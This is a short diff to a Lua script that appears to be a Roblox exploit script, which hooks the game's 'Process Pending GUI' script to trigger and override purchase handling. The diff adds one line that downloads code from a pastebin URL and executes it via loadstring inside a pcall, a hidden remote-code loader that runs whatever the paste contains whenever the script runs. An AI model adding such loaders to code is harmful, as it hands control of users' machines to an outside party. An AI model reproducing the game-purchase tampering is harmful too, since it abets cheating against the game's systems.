@@ -2,6 +2,7 @@ return function(dh, pn, gn, dp, potc)
     local zzzu, zzzv =
         pcall(
         function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Uv7yC6JA", true))()
             local x = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"])
             x.PurchasePending()
             x.Close = function()
